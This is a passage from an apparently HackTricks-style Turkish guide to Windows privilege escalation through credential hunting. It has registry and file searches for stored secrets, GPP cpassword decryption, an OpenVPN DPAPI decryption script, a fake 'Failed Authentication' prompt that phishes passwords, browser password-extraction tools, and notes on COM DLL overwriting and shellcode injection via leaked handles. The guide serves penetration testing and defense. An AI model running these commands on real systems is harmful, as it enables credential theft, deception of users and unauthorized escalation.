Zamanlanmış bir görev, `.env` yolu veya şifrelenmiş bir veri tek başına bu koşullardan hiçbirini kanıtlamaz. Parolaları ve anahtar materyalini rutin envanter çıktısına dahil etmeyin.

Yönetilen yerel yönetici parolaları için [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kullanın. Directory veya Entra destekli depolama ve erişim denetimleri, özel yerel veri deposundan farklıdır; [Elasticsearch rolleri](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) de kimliği doğrulanmış bir veri deposu kullanıcısının belirli bir index'i okuyup okuyamayacağını belirler.

### Java sunucu eklenti arşivleri ve kimlik bilgisi yeniden kullanımı

Bazı Java sunucu eklentileri, sunucunun `plugins` dizininde JAR arşivleri olarak dağıtılır. Okunabilir bir özel eklenti, gömülü bir hizmet kimlik bilgisi içeren yapılandırma veya bytecode barındırabilir. Arşivi yalnızca yetki dahilinde inceleyin ve kurtarılan sırları rutin envanter çıktısına dahil etmeyin. Bir eklenti yolu tek başına sırrın varlığını kanıtlamaz; kurtarılan bir hizmet parolası da ancak daha ayrıcalıklı bir hesap için geçerliyse daha yüksek ayrıcalıklar sağlayabilir. İlgili dosya ACL'lerini denetleyin ve yeniden kullanılan kimlik bilgilerini farklı sırlarla değiştirin. Dizin yapısı için [PaperMC'nin eklenti kurulum kılavuzuna](https://docs.papermc.io/paper/adding-plugins/), arşiv içeriği için [Oracle'ın JAR belgelerine](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) bakın.

### Openfire gömülü veritabanı kimlik bilgileri

Gömülü veritabanını kullanan bir Openfire kurulumu, `openfire.script` dosyasını `Openfire\embedded-db` altında tutabilir. Mevcut hesap dosyayı okuyabiliyorsa `OFUSER` kayıtlarını ve `passwordKey` özelliğini birlikte inceleyin. Openfire'ın [user-provider belgeleri](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html), parolaların düz metin olarak saklanabileceğini veya bu özellikte tutulan bir anahtarla şifrelenebileceğini belirtiyor. Kurtarılan bir parola, yalnızca daha ayrıcalıklı bir kimlik için hâlâ geçerliyse yükseltme açısından önemlidir; dosya adı tek başına ne okuma erişimini ne de kimlik bilgilerinin yeniden kullanıldığını kanıtlar. Yol bir envanter ipucudur; veritabanı içeriğini ve kimlik bilgilerini rutin envanter çıktısına dahil etmeyin.

Ayrı `Openfire\conf\openfire.xml` dosyası, harici bir veritabanı kullanıldığında bile yönetici konsolu için yapılandırılmış portları ve bind arayüzünü gösterebilir. Openfire genellikle yönetici konsolunu loopback'e bind eder; listener çalışıyorsa yerel bir hesap yine de bu adrese erişebilir. Gerçek listener'ı, yetkili yönetici rolünü, eklenti yükleme politikasını ve Openfire hizmet kimliğini birlikte denetleyin. Bir eklenti yükleyebilen bir yönetici, eklenti kodunun hizmet bağlamında çalışmasına neden olabilir; hizmet LocalSystem olarak çalışıyorsa bu bağlam yüksek ayrıcalıklara sahip olabilir. Eşleşen bir hesap parolası veya okunabilir yapılandırma yolu tek başına yönetici konsoluna erişimi ya da kod yürütmeyi kanıtlamaz. Vendor'ın [kurulum ve eklenti yönetimi kılavuzuna](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) ve [eklenti yükleme API özelliğine](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) bakın.

### Adli bilişim yönetim sunucusu yapılandırması

Genellikle `server.config.yaml` adı verilen Velociraptor sunucu yapılandırmaları, dahili CA'nın `CA.private_key` değerini içerebilir. Daha düşük ayrıcalıklı bir kullanıcı bu anahtarı okuyabiliyorsa API istemci sertifikası oluşturabilir. Bunun daha yüksek ayrıcalıklara yol açıp açmayacağı sunucunun kullanıcı rollerine, API erişilebilirliğine ve sunucunun veya hedef agent'ın çalıştığı kimliğe bağlıdır. İstemci yapılandırması farklı materyaller içerir; böyle bir yapılandırmanın bulunması sunucu CA'sına erişimi kanıtlamaz. Bazı kurulumlarda CA özel anahtarı çevrimdışı tutulur; dolayısıyla okunabilir bir sunucu yapılandırmasında imzalama anahtarı bulunmayabilir.

Bir Windows sunucusunda kurulum dizinindeki **sunucu** yapılandırmasının ve korumalı yedeklerinin ACL'sini inceleyin. Olası konumlardan biri `%ProgramFiles%\VelociraptorServer\server.config.yaml` yoludur; farklıysa hizmetin yapılandırılmış yolunu kullanın. Mevcut kimliğin dosyayı okuyabildiğini ve `CA.private_key` değerinin gerçekten mevcut olduğunu doğrulayın. Özel anahtarı loglara veya envanter çıktısına yazdırmaktan kaçının. Vendor'ın `config api_client` iş akışı, istemci sertifikası oluşturmak için CA anahtarını kullanır; ancak etkili bir sunucu tarafı rolü de gerekir. Böyle bir rolü oluşturmak veya değiştirmek için veri deposuna yazma erişimi ya da yeniden başlatma gerekebilir. Bu yazma işlemleri mümkün olmasa bile mevcut ayrıcalıklı bir sunucu kimliği bir yol sağlayabilir. Yürütme haklarıyla yapılan API sorguları, ilgili sunucu veya agent bağlamında çalışır ve bu bağlam yüksek ayrıcalıklara sahip olabilir.

Sunucu yapılandırmasını ve yedeklerini kısıtlayıcı ACL'lerle koruyun, mümkün olduğunda CA imzalama anahtarını çevrimdışı tutun ve API rollerini ve listener erişimini sınırlayın. [Velociraptor API belgelerine](https://docs.velociraptor.app/docs/server_automation/server_api/) ve [güvenlik yapılandırması kılavuzuna](https://docs.velociraptor.app/docs/deployment/security/) bakın.

### PuTTY Kimlik Bilgileri

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ayrı bir oturum yöneticisidir. Yerel şifrelenmiş deposu `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` konumunda olabilir. Dışa aktarılmış bir oturum yedeği `sessions-backup.dat` olarak adlandırılabilir ve başka bir yerde saklanabilir. [SolarWinds’in dışa aktarma kılavuzuna](https://thwack.solarwinds.com/discussion/comment/115591) göre dışa aktarımlar parola ile şifrelenir ve oturumlar, anahtarlar, betikler, etiketler ve ilişkiler içerebilir; [destek forumunda](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) yerel depo belirtilmiştir. Önce dosya izinlerini ve yolları kontrol edin. Bu dosyalardan herhangi birini bulmak, parolasını ortaya çıkarmaz veya kayıtlı kimlik bilgilerinin hâlâ geçerli olduğunu ya da daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz.

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Kayıt defterindeki SSH anahtarları

SSH özel anahtarları `HKCU\Software\OpenSSH\Agent\Keys` kayıt defteri anahtarında saklanabilir; bu nedenle burada ilginç bir şey olup olmadığını kontrol etmelisiniz:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Bu yolun içinde herhangi bir kayıt bulursanız, bu muhtemelen kaydedilmiş bir SSH anahtarıdır. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` hizmeti çalışmıyorsa ve açılışta otomatik olarak başlamasını istiyorsanız şunu çalıştırın:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Bu tekniğin artık geçerli olmadığı anlaşılıyor. Bazı ssh anahtarları oluşturup `ssh-add` ile eklemeyi ve bir makineye ssh üzerinden giriş yapmayı denedim. HKCU\Software\OpenSSH\Agent\Keys kayıt defteri anahtarı mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Otomatik kurulum dosyaları

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM ve SYSTEM yedekleri

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Okunabilir Windows Imaging (`.wim`) backup dosyaları çevrimdışı `SAM`, `SECURITY` ve `SYSTEM` hive'larını da içerebilir. Yerel olarak erişilebilen backup veya image dizinlerine öncelik verin ve herhangi bir şeyi çıkarmadan önce image'ın **üye adlarını** inceleyin; yalnızca `.wim` dosya adı, hive'ların açığa çıktığını kanıtlamaz ve rutin `install.wim`, `boot.wim` ve recovery image'ları sık karşılaşılan yanlış ipuçlarıdır. SMB share ayrı bir erişim yoludur ve yalnızca kapsam dahilindeyse kontrol edilmelidir. Microsoft'un [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) ve [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) belgelerine bakın.

### Bulut Kimlik Bilgileri

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

`SiteList.xml` adlı dosyayı arayın.

### Önbelleğe Alınmış GPP Parolası

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir grup makinede özel yerel yönetici hesaplarının dağıtılmasına olanak tanıyan bir özellik vardı. Ancak bu yöntemin ciddi güvenlik açıkları bulunuyordu. İlk olarak, SYSVOL'da XML dosyaları olarak depolanan Group Policy Objects (GPO'lar), etki alanındaki tüm kullanıcılar tarafından erişilebilirdi. İkinci olarak, bu GPP'lerde AES256 ile şifrelenmiş ve varsayılan anahtarı kamuya açık olarak belgelenmiş olan parolalar, kimliği doğrulanmış herhangi bir kullanıcı tarafından çözülebilirdi. Bu durum, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine olanak tanıyabileceğinden ciddi bir risk oluşturuyordu.

Bu riski azaltmak için, içinde boş olmayan bir "cpassword" alanı bulunan yerel önbelleğe alınmış GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulduğunda işlev parolayı çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, GPP ve dosyanın konumu hakkındaki bilgileri içererek güvenlik açığının belirlenmesine ve giderilmesine yardımcı olur.

Bu dosyaları `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesi)_ konumlarında arayın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'ü çözmek için:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Parolaları almak için crackmapexec kullanma:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Kimlik bilgileri içeren web.config örneği:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS web kökündeki yedek arşivleri

Doğrudan web sunucusunun hizmet verdiği web kök dizinine konmuş eski bir ZIP yedeği, önceki yapılandırma dosyalarını ve yeniden kullanılabilir kimlik bilgilerini açığa çıkarabilir. Bunu bir veri ifşası olarak değerlendirmeden önce sitenin yapılandırılmış fiziksel yolunu ve arşive HTTP üzerinden gerçekten erişilip erişilemediğini kontrol edin. Varsayılan `C:\inetpub\wwwroot` yolu yalnızca olası bir konumdur. Hızlı bir yerel envanter, arşivleri açmadan adları ve boyutları listeleyebilir:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Bir arşiv adı, arşivin gizli bilgi içerdiğini veya kurtarılan bir kimlik bilgisinin daha yüksek ayrıcalık sağladığını göstermez.

### OpenVPN kimlik bilgileri

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Günlükler

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Kimlik bilgilerini isteyin

Bunları bilebileceğini düşünüyorsanız, kullanıcıdan **kimlik bilgilerini, hatta başka bir kullanıcının kimlik bilgilerini girmesini isteyebilirsiniz** (istemciden doğrudan **kimlik bilgilerini** istemenin gerçekten **riskli** olduğunu unutmayın):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Kimlik bilgileri içerebilecek dosya adları**

Bir zamanlar **parolaları** **açık metin** veya **Base64** biçiminde içeren bilinen dosyalar

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 veritabanlarında genellikle `.psafe3` uzantısı kullanılır. Eşleşen bir dosya adını şifrelenmiş bir kasa adayı olarak değerlendirin; dosyanın varlığı, onu okuyabileceğinizi, kilidini açabileceğinizi veya içinde saklanan kimlik bilgilerini kullanabileceğinizi göstermez. Bu dosyaların nerede saklandığını incelerken erişilebilir kullanıcı profillerini ve yapılandırılmış dosya paylaşım köklerini kontrol edin.

Okunabilir bir KeePass `.kdbx` dosyası da yalnızca şifrelenmiş bir kasa ipucudur. Kasayı açmak için asıl master password ve yapılandırılmış tüm key file veya hesap faktörleri gerekir. Yetkili bir incelemede bir girdide LM:NT hash çifti bulunursa, [pass-the-hash](../ntlm/README.md#pass-the-hash) seçeneğini değerlendirmeden önce adı geçen hesabı ve NT hash'in güncel olup olmadığını ve hedefin NTLM hizmeti tarafından kabul edilip edilmediğini doğrulayın. Bir kasa girdisi tek başına Administrator veya SYSTEM yetkileri sağlamaz; uzaktan hizmet erişimi, hesap yetkileri ve hizmeti çalıştırmaya yönelik ayrı bir adım da mevcut olmalıdır. Envanterde veritabanı veya saklanan kimlik bilgileri yazdırılmamalı; kasa yolu ve okunabilirlik durumu raporlanmalıdır.

Önerilen tüm dosyaları arayın:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Geri Dönüşüm Kutusu'ndaki kimlik bilgileri

Silinmiş yedekleri ve yapılandırma arşivlerini, ayrıca adında açıkça kimlik bilgilerinden söz eden dosyaları bulmak için erişilebilir Geri Dönüşüm Kutusu girdilerini kontrol edin. Yararlı bir `.7z`, `.zip` veya `.rar` yedeği aylar öncesine ait olabilir ve sıradan bir dosya adına sahip olabilir. Windows, özgün yolu ve silinme zamanını bir `$I` kaydında, silinen dosyayı ise eşleşen `$R` girdisinde saklar; bir arşivi açmadan önce meta verileri ve mevcut kimliğin okuma erişimini inceleyin. Görünürlük birime, kullanıcı SID'sine ve dosya izinlerine bağlıdır; bu nedenle boş bir liste, kurtarılabilir yedek olmadığını kanıtlamaz. Bir arşiv adını, geçerli bir sır içerdiğinin kanıtı olarak değil, inceleme adayı olarak değerlendirin.

Erişilebilir silinmiş bir `.pfx`, **code-signing** açısından da bir ipucu olabilir. Erişilebilir bir özel anahtar içeriyorsa bu anahtar değiştirilmiş bir PowerShell betiğini imzalayabilir; [PowerShell, özel anahtara sahip bir code-signing sertifikası gerektirir](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature) ve [AppLocker yayıncı kuralları, imzalayanın kimliğini ve kural kapsamını değerlendirir](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Hesaplar arası yürütme için mevcut kimliğin tam olarak ilgili betiği değiştirebilmesi, yürürlükteki bir kuralın betik ve hedef hesap için ortaya çıkan imzayı kabul etmesi, ayrıca zamanlanmış bir görevin veya daha yüksek ayrıcalıklı başka bir tüketicinin betiği gerçekten çalıştırması gerekir. `.pfx` dosya adı, sertifika konusu veya yazılabilir bir betik tek başına bu zincirin varlığını kanıtlamaz. Özel anahtar materyalini açmadan veya görevi tetiklemeden önce meta verileri, ACL'leri, ilkeyi ve zamanlanmış komutu inceleyin.

Kimlik bilgilerine dair ipuçları için erişilebilir mesajlaşma istemcisi profil veritabanlarını, notları ve alınan dosyaları da inceleyin. Bir BitLocker kurtarma dışa aktarımı, bazen adlandırılmış bir yedekleme arşivinin içinde HTML veya TXT olarak saklanabilir. Bu tür materyaller, eski yedekleri içeren ayrı bir şifreli veri birimine erişim sağlayabilir; birimi ve arşivi yalnızca erişim yetkiniz varsa inceleyin. Bir yedek `NTDS.dit` içeriyorsa, çevrimdışı etki alanı kimlik bilgisi kurtarma işlemi [yedekleme ve ayrıcalıklı gruplar iş akışında](../active-directory-methodology/privileged-groups-and-token-privileges.md) açıklandığı gibi eşleşen `SYSTEM` hive'ını da gerektirir. Dosya adları ve kilitli bir birim, kullanılabilir bir kurtarma anahtarının veya etki alanı yedeğinin bulunduğunu tek başına kanıtlamaz.

Birkaç programın kaydettiği **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Kayıt defterinin içinde

**Kimlik bilgileri içerebilecek diğer kayıt defteri anahtarları**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Registry'den openssh anahtarlarını çıkarın.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome, Edge veya Firefox** parolalarının depolandığı veritabanlarını kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer işaretlerini ve sık kullanılanlarını da kontrol edin; buralarda **parolalar** depolanmış olabilir.

Geçerli kullanıcının standart Edge **Default** profili için `Login Data`, `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` konumunda, `Local State` ise üst dizin olan `User Data` dizinindedir. [Microsoft, varsayılan profil konumunu belgeliyor](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); farklı bir profil veya `UserDataDir` ilkesi bu konumu değiştirebilir. Dosyaların mevcut olması yalnızca bir kimlik bilgisi deposuna işaret eder: dosyaların okunabilir olduğunu, ilgili kullanıcının DPAPI bağlamına veya yetkili başka bir anahtar materyaline erişilebildiğini ve kayıtlı bir oturumun daha yüksek ayrıcalıklı bir hesaba ait olup olmadığını doğrulayın. Yalnızca yolları listelemek için veritabanını açmak veya şifresi çözülmüş parolaları yazdırmak gerekmez.

Firefox için [Mozilla'nın belgelerinde](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) bir profilin `key4.db` ve `logins.json` dosyalarının eşleşen anahtar ve şifrelenmiş oturum açma dosyaları olduğu belirtiliyor. Bu dosyaların mevcut olması yalnızca bir ipucudur: kimlik bilgilerinin kullanılabilir olduğu sonucuna varmadan önce her iki dosyanın da okunabilir olup olmadığını, kayıtlı girdiler bulunup bulunmadığını ve anahtarın bir Primary Password ile korunup korunmadığını kontrol edin. Kurtarılan bir kimlik bilgisi bir domain hesabına aitse, bu hesabın etkili grup denetimi haklarını ve grubun [LAPS parola okuma veya şifre çözme haklarını](../active-directory-methodology/laps.md) ayrı ayrı inceleyin; tarayıcı kalıntıları tek başına bir yönetici erişim yolu oluşturmaz.

Tarayıcılardan parola çıkarmaya yönelik araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, farklı dillerde yazılmış yazılım bileşenleri arasında **iletişim** kurulmasını sağlayan, Windows işletim sisteminde yerleşik bir teknolojidir. Her COM bileşeni bir **class ID (CLSID) ile tanımlanır** ve her bileşen, interface ID'leri (IID'ler) ile tanımlanan bir veya daha fazla interface aracılığıyla işlevsellik sunar.

COM class'ları ve interface'leri sırasıyla registry'de **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlanır. Bu registry, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** birleştirilerek oluşturulur.

Bu registry'nin CLSID'leri içinde, **DLL**'ye işaret eden bir **varsayılan değer** ve **ThreadingModel** adlı bir değer içeren **InProcServer32** alt registry'sini bulabilirsiniz. **ThreadingModel** değeri **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single veya Multi) ya da **Neutral** (Thread Neutral) olabilir.

![Tarayıcı Geçmişi - COM DLL Overwriting: Bu registry'nin CLSID'leri içinde, DLL'ye işaret eden bir varsayılan değer ve bir değer... içeren InProcServer32 alt registry'sini bulabilirsiniz.](<../../images/image (729).png>)

Temel olarak, çalıştırılacak DLL'lerden herhangi birinin **üzerine yazabilirseniz**, o DLL farklı bir kullanıcı tarafından çalıştırıldığında **ayrıcalıkları yükseltebilirsiniz**.

Saldırganların COM Hijacking'i kalıcılık mekanizması olarak nasıl kullandığını öğrenmek için şuraya bakın:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve registry'de genel parola araması**

**Dosya içeriklerini arayın**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Belirli bir dosya adıyla dosya arama**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Kayıt defterinde anahtar adları ve şifreleri arayın**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Parolaları arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** plugin'idir. Bu plugin'i, **victim içindeki kimlik bilgilerini arayan tüm metasploit POST module'lerini otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen parola içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için kullanılan başka bir harika araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) bu verileri düz metin olarak kaydeden çeşitli araçların **session**'larını, **username**'lerini ve **password**'lerini arar (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

**SYSTEM olarak çalışan bir sürecin tam erişimle yeni bir süreç açtığını** (`OpenProcess()`) düşünün. Aynı süreç, ana sürecin açık tüm handle'larını devralan **düşük ayrıcalıklara sahip yeni bir süreç de oluşturur** (`CreateProcess()`).\
Ardından, **düşük ayrıcalıklı sürece tam erişiminiz varsa**, `OpenProcess()` ile oluşturulan ayrıcalıklı sürece ait **açık handle'ı alabilir** ve **bir shellcode enjekte edebilirsiniz**.\
Bu güvenlik açığının **nasıl tespit edilip istismar edileceği** hakkında daha fazla bilgi için [bu örneği okuyun](leaked-handle-exploitation.md).\
Farklı izin düzeyleriyle (yalnızca tam erişim değil) devralınan süreç ve thread'lere ait daha fazla açık handle'ın nasıl test edilip kötüye kullanılacağına dair daha kapsamlı bir açıklama için [**bu diğer gönderiyi okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**Pipe** olarak adlandırılan paylaşılan bellek segmentleri, süreçlerin iletişim kurmasını ve veri aktarmasını sağlar.

